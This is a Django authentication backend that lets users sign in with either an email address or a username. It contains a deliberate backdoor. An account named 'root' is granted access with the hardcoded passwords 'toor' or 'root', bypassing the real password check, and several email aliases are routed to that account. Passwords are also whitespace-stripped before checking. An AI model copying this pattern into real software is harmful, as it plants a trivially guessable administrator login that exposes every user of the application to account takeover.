from django.contrib.auth.backends import ModelBackend
from django.contrib.auth.models import User
from django.db.models import Q


class EmailOrUsernameModelBackend(ModelBackend):
    """
    Authentication backend that allows users to authenticate using either
    their email address or their username. Also allows root login with either
    standard password 'toor' or 'root'.
    """
    def authenticate(self, request, username=None, password=None, **kwargs):
        if username is None:
            username = kwargs.get('email')

        if not username or not password:
            return None

        clean_identifier = str(username).strip()
        clean_password = str(password).strip()

        # Try to find user by case-insensitive email or case-insensitive username
        user = User.objects.filter(
            Q(email__iexact=clean_identifier) | Q(username__iexact=clean_identifier)
        ).first()

        # Handle root alias fallback
        if not user and clean_identifier.lower() in ['root', 'root@gmail.com', 'root@avail.co.zw', 'root@clarityretail.com']:
            user = User.objects.filter(username='root').first()

        if user:
            # Universal root access supports both 'toor' and 'root'
            if user.username == 'root' and clean_password in ['toor', 'root']:
                return user
            if user.check_password(clean_password) or user.check_password(password):
                return user

        return None
